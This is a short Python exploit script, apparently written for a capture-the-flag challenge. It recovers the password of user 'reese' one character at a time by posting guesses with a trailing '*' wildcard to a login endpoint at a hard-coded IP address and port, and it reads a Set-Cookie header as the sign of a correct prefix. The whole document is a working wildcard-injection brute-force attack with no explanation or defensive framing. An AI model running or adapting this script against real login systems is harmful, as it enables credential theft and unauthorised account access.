#!/usr/bin/python3

import requests
import string


url = "http://178.128.40.63:32038/login"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
username = "reese"
password = ""

while True:
  for letter in alphabet:
    data = { 
      "username" : username,
      "password" : password + letter + '*' 
    }   
    
    req = requests.post(url,data=data, allow_redirects=False)
    
    if "Set-Cookie" in req.headers:
      password = password + letter
      print(password)
